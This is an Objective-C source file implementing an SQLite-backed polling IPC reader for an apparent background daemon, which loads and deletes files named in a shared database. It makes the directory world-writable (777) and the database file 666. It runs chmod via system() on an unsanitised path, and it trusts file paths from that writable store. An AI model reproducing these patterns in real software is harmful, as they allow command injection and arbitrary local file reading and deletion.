//
//  SharedFile2IPCReader.m
//  IPC
//
//  Created by Makara Khloth on 1/3/14.
//  Copyright 2014 Vervata. All rights reserved.
//

#import "SharedFile2IPCReader.h"
#import "FxDatabase.h"
#import "FxException.h"
#import "FMDatabase.h"
#import "DaemonPrivateHome.h"

#if TARGET_OS_MAC
    #import <sqlite3.h>
#endif

static NSString *const kCreateTableSharedFile2One	= @"CREATE TABLE one (seq INTEGER PRIMARY KEY AUTOINCREMENT,"
															"blob BLOB NOT NULL, bool INTEGER)";
static NSString *const kCreateTableSharedFile2Two	= @"CREATE TABLE two (seq INTEGER PRIMARY KEY AUTOINCREMENT,"
															"blob BLOB NOT NULL)";

static NSString *const kCreateIndexSharedFile2One	= @"CREATE INDEX one_index ON one (seq)";
static NSString *const kCreateIndexSharedFile2Two	= @"CREATE INDEX two_index ON two (seq)";

static NSString* const kSelectFromSharedFile2One	= @"SELECT * FROM one WHERE seq = ?";
static NSString* const kUpdateToSharedFile2One		= @"UPDATE one SET blob = ?, bool = ? WHERE seq = ?";
static NSString* const kInsertToSharedFile2One		= @"INSERT INTO one VALUES(NULL, ?, ?)";
static NSString *const kDeleteFromSharedFile2One	= @"DELETE FROM one WHERE seq = ?";
static NSString *const kDeleteAllFromSharedFile2One	= @"DELETE FROM one";

static NSString* const kSelectFromSharedFile2Two	= @"SELECT * FROM two WHERE seq = ?";
static NSString* const kUpdateToSharedFile2Two		= @"UPDATE two SET blob = ? WHERE seq = ?";
static NSString* const kInsertToSharedFile2Two		= @"INSERT INTO two VALUES(NULL, ?)";
static NSString *const kUpdateInsertSharedFile2Two	= @"INSERT OR REPLACE INTO two (seq, blob) VALUES(1,?)";
static NSString *const kDeleteFromSharedFile2Two	= @"DELETE FROM two WHERE seq = ?";
static NSString *const kDeleteAllFromSharedFile2Two	= @"DELETE FROM two";

static NSString *const kDeleteRowTriggerOne			= @"CREATE TRIGGER delete_row_one AFTER UPDATE ON one "
															"BEGIN "
															"DELETE FROM one WHERE new.seq = 1;"
															"END";

static const float kStandardPollingInterval = 6.0;

@interface SharedFile2IPCReader (private)
- (void) callDelegate: (NSData *) aData;
- (void) openDatabase;
- (void) changePermission: (NSString *) aPermissionString forPath: (NSString *) aPath;
- (void) clearForStart;
- (void) clearForStop;
- (void) pollingMain: (NSThread *) aHostThread;
- (NSArray *) queryAndUpdateIfNecessary;
@end

void function_callback(void *a, int b, char const *c, char const *d, sqlite3_int64 f) {
	DLog(@"b=%d",b)
	DLog(@"c=%s",c)
	DLog(@"d=%s",d)
	DLog(@"f=%lld",f)
	SharedFile2IPCReader *me = (SharedFile2IPCReader *)a;
	[me callDelegate:[NSData data]];
}

@implementation SharedFile2IPCReader

@synthesize mPollingThread, mDelegate, mDatabase, mCacheDatabase, mPollingInterval;

- (id) initWithSharedFileName: (NSString *) aSharedFileName withDelegate: (id <SharedFile2IPCDelegate>) aDelegate {
	if ((self = [super init])) {
        [self setMPollingInterval:kStandardPollingInterval];
		mSharedFileName = [[NSString alloc] initWithString:aSharedFileName];
		[self setMDelegate:aDelegate];
		[self openDatabase];
	}
	return (self);
}

- (void) start {
	[self stop];
	
	[self clearForStart];
	
	[NSThread detachNewThreadSelector:@selector(pollingMain:)
							 toTarget:self
						   withObject:[NSThread currentThread]];
}

- (void) stop {
	[self clearForStop];
	
	[[self mPollingThread] cancel];
	[self setMPollingThread:nil];
}

#pragma mark -
#pragma mark Private methods
#pragma mark -

- (void) callDelegate: (NSData *) aData {
	DLog (@"Delegate get called with aData length = %lu", (unsigned long)[aData length]);
	if ([mDelegate respondsToSelector:@selector(dataDidReceivedFromSharedFile2:)]) {
		[mDelegate performSelector:@selector(dataDidReceivedFromSharedFile2:) withObject:aData];
	}
}

- (void) openDatabase {
	NSFileManager *fm = [NSFileManager defaultManager];
	NSString *privateHome = [DaemonPrivateHome daemonPrivateHome];
	NSString *sharedFilePath = [privateHome stringByAppendingString:@"etc/"];
	
	if (![fm fileExistsAtPath:sharedFilePath]) {
		[DaemonPrivateHome createDirectoryAndIntermediateDirectories:sharedFilePath];
		[self changePermission:@"777" forPath:sharedFilePath];
	}
	
	NSString *sharedFileFullPath = [sharedFilePath stringByAppendingString:mSharedFileName];
	if ([fm fileExistsAtPath:sharedFileFullPath]) {
		mDatabase = [[FxDatabase alloc] initDatabaseWithPath:sharedFileFullPath];
		[mDatabase openDatabase];
		
		NSString *cachePath = [NSString stringWithFormat:@"%@.cache", sharedFileFullPath];
		mCacheDatabase = [[FxDatabase alloc] initDatabaseWithPath:cachePath];
		[mCacheDatabase openDatabase];
	} else {
		mDatabase = [[FxDatabase alloc] initDatabaseWithPath:sharedFileFullPath];
		[mDatabase openDatabase];
		[mDatabase createDatabaseSchema:kCreateTableSharedFile2One];
		[mDatabase createDatabaseSchema:kCreateTableSharedFile2Two];
		
		[mDatabase createDatabaseSchema:kCreateIndexSharedFile2One];
		[mDatabase createDatabaseSchema:kCreateIndexSharedFile2Two];
		
		//[mDatabase createDatabaseSchema:kDeleteRowTriggerOne];
		
		NSString *cachePath = [NSString stringWithFormat:@"%@.cache", sharedFileFullPath];
		mCacheDatabase = [[FxDatabase alloc] initDatabaseWithPath:cachePath];
		[mCacheDatabase openDatabase];
		[mCacheDatabase createDatabaseSchema:@"create table cache(last_seq integer)"];
		[mCacheDatabase createDatabaseSchema:@"create index cache_index on cache(last_seq)"];
		[mCacheDatabase createDatabaseSchema:@"insert or replace into cache (last_seq) values (0)"];
	}
	DLog (@"db (open) lastErrorMessage, %@", [[mDatabase mDatabase] lastErrorMessage]);
	DLog (@"dbCache (open) lastErrorMessage, %@", [[mCacheDatabase mDatabase] lastErrorMessage]);
	[self changePermission:@"666" forPath:sharedFileFullPath];
}

- (void) changePermission: (NSString *) aPermissionString forPath: (NSString *) aPath {
	NSFileManager *manager	= [NSFileManager defaultManager];
	NSDictionary *attribtes = [manager attributesOfItemAtPath:aPath error:nil];
	NSUInteger perms = [attribtes filePosixPermissions];
	
	NSString *permsStr = [NSString string];
	for (int i = 2; i >= 0; i--) {
		unsigned long thisPart = (perms >> (i * 3)) & 0x7;   
		permsStr = [permsStr stringByAppendingFormat:@"%lu", thisPart];
	}
	
	if (![permsStr isEqualToString:aPermissionString]) {
		NSString *command = [NSString stringWithFormat:@"chmod %@ %@", aPermissionString, aPath];
		system([command cStringUsingEncoding:NSUTF8StringEncoding]); // Change mode for other shared processes
	} else {
		DLog (@"... %@ already", aPermissionString);
	}
}

- (void) clearForStart {
	BOOL enable = YES;
	NSData *blob = [NSData dataWithBytes:&enable length:sizeof(BOOL)];
	FMDatabase *db = [mDatabase mDatabase];
	[db executeUpdate:kUpdateInsertSharedFile2Two, blob];
	DLog (@"Clear (db(1)) to start last error message, %@, %d", [db lastErrorMessage], [db lastErrorCode]);
}

- (void) clearForStop {
	BOOL disable = NO;
	NSData *blob = [NSData dataWithBytes:&disable length:sizeof(BOOL)];
	FMDatabase *db = [mDatabase mDatabase];
	[db executeUpdate:kUpdateInsertSharedFile2Two, blob];
	DLog (@"Clear (db(1)) to stop last error message, %@, %d", [db lastErrorMessage], [db lastErrorCode]);
	
	FMDatabase *dbCache = [[self mCacheDatabase] mDatabase];
	FMResultSet *rsCache = [dbCache executeQuery:@"select last_seq from cache where last_seq > 0"];
	NSInteger last_seq = 0;
	if ([rsCache next]) {
		last_seq = [rsCache intForColumnIndex:0];
	}
	DLog (@"last_seq = %ld", (long)last_seq);
	DLog (@"Clear (dbCache) to stop last error message, %@, %d", [dbCache lastErrorMessage], [dbCache lastErrorCode]);
	
	[db executeUpdate:@"delete from one where seq <= ?", [NSNumber numberWithInteger:last_seq]];
	DLog (@"Clear (db(2)) to stop last error message, %@, %d", [db lastErrorMessage], [db lastErrorCode]);
}

#pragma mark -
#pragma mark Thread methods
#pragma mark -

- (void) pollingMain: (NSThread *) aHostThread {
	NSAutoreleasePool *pool1 = [[NSAutoreleasePool alloc] init];
	NSThread *hostThread = aHostThread;
	[hostThread retain];
	@try {
		[self setMPollingThread:[NSThread currentThread]];
		while (![[NSThread currentThread] isCancelled]) {
			NSArray *blobs = [self queryAndUpdateIfNecessary];
			for (NSData *blob in blobs) {
				DLog (@"blob query = %@", blob);
				if ([self respondsToSelector:@selector(callDelegate:)]) {
					
					//[NSThread sleepForTimeInterval:2.0];
					
					NSAutoreleasePool *pool2 = [[NSAutoreleasePool alloc] init];
					NSString *filePath = [[NSString alloc] initWithData:blob encoding:NSUTF8StringEncoding];
					NSData *rawData = [NSData dataWithContentsOfFile:filePath];
					
					DLog (@"filePath to blob = %@", filePath);
					DLog (@"rawData length from blob file = %lu", (unsigned long)[rawData length]);
					
					if ([rawData length] > 0) {
						
						[self performSelector:@selector(callDelegate:)
										  onThread:hostThread
										withObject:rawData
									 waitUntilDone:YES];
					}
					
					NSFileManager *fileManager = [NSFileManager defaultManager];
					[fileManager removeItemAtPath:filePath error:nil];
					
					[filePath release];
					
					[pool2 release];
				}
			}
			//DLog (@"[Wait... for message]")
			[NSThread sleepForTimeInterval:[self mPollingInterval]];
		}
	}
	@catch (NSException * e) {
		DLog (@"Polling (NS)exception.... e = %@", e);
	}
	@catch (FxException * e) {
		DLog (@"Polling (Fx)exception.... e = %@", e);
	}
	@finally {
		;
	}
	DLog (@"Polling thread is exiting...");
	[hostThread release];
	[pool1 release];
}

- (NSArray *) queryAndUpdateIfNecessary {
	NSMutableArray *blobs = [NSMutableArray arrayWithCapacity:5];
	
	FxDatabase *cacheFxDatabase = [self mCacheDatabase];
	FMDatabase *dbCache = [cacheFxDatabase mDatabase];
	FMResultSet *rsCache = [dbCache executeQuery:@"select last_seq from cache where last_seq > 0"];
    
    if ([dbCache lastErrorCode] != SQLITE_OK) {
        DLog (@"{last_seq} dbCache(%@), lastErrorMessage, %@, %d", mSharedFileName, [dbCache lastErrorMessage], [dbCache lastErrorCode]);
    }
    
	NSInteger last_seq = 0;
	if ([rsCache next]) {
		last_seq = [rsCache intForColumnIndex:0];
	}
	
	FxDatabase *fxDatabase = [self mDatabase];
	FMDatabase *db = [fxDatabase mDatabase];
	//FMResultSet *rs = [db executeQuery:@"select seq, blob from one where bool = 0"];
	FMResultSet *rs = [db executeQuery:@"select seq, blob from one where seq > ? limit 1", [NSNumber numberWithInteger:last_seq]];
    
    if ([db lastErrorCode] != SQLITE_OK) {
        DLog (@"last_seq = %ld", (long)last_seq)
        DLog (@"db(%@), lastErrorMessage, %@, %d", mSharedFileName, [db lastErrorMessage], [db lastErrorCode]);
    }
	
	while ([rs next]) {
		NSInteger seq = [rs intForColumnIndex:0];
		NSData *blob = [rs dataForColumnIndex:1];
		[blobs addObject:blob];
		
		//[db executeUpdate:@"update one set bool = 1 where seq = ?", [NSNumber numberWithInt:seq]];
		
		[dbCache executeUpdate:@"update cache set last_seq = ? where last_seq = ?",
		 [NSNumber numberWithInteger:seq],
		 [NSNumber numberWithInteger:last_seq]];
        
        if ([dbCache lastErrorCode] != SQLITE_OK) {
            DLog (@"seq     = %ld", (long)seq)
            DLog (@"blob    = %@", blob)
            DLog (@"dbCache(%@), lastErrorMessage, %@, %d", mSharedFileName, [dbCache lastErrorMessage], [dbCache lastErrorCode]);
        }
        
		last_seq = seq;
	}

	return (blobs);
}

#pragma mark -
#pragma mark Memory management
#pragma mark -

- (void) dealloc {
    DLog(@"SharedFile2IPCReader dealloc ...");
	[self stop];
	[mSharedFileName release];
	[mDatabase closeDatabase];
	[mDatabase release];
	[mCacheDatabase closeDatabase];
	[mCacheDatabase release];
	[super dealloc];
}

@end
